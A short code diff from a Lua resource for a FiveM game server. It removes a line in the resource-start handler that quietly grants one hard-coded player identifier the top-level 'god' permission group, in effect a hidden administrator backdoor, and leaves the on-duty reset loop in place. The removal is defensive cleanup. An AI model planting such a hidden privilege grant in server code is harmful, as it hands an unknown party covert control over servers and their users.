@@ -173,7 +173,7 @@ end)
 
 AddEventHandler('onResourceStart', function(resourceName)
     if resourceName ~= GetCurrentResourceName() then return end
-    lib.addPrincipal("identifier.fivem:1123242", "group.god")
+    
     for _, playerId in pairs(GetPlayers()) do
         setOffDuty(tonumber(playerId))
     end
